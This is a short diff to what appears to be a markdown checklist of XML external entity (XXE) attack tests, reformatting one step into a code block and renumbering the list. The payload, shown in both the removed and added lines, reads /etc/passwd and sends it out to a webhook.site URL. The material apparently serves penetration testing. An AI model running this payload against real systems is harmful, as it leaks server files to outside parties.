@@ -108,15 +108,17 @@ xml:
 
 2. **Can we exfiltrate sensitive information?**
 
-   - <?xml version="1.0" encoding="UTF-8"?>  
-     <!DOCTYPE foo [  
-       <!ENTITY xxe SYSTEM "file:///etc/passwd">  
-       <!ENTITY % remote SYSTEM "https://webhook.site/?data=%xxe;">  
-       %remote;  
-     ]>  
-     <foo>&xxe;</foo>
+   ```xml
+   <?xml version="1.0" encoding="UTF-8"?>  
+   <!DOCTYPE foo [  
+     <!ENTITY xxe SYSTEM "file:///etc/passwd">  
+     <!ENTITY % remote SYSTEM "https://webhook.site/?data=%xxe;">  
+     %remote;
+   ]>
+   <foo>&xxe;</foo>
+   ```
 
-  4. **Can we achieve code execution?**  
+3. **Can we achieve code execution?**  
   
 </details>
 
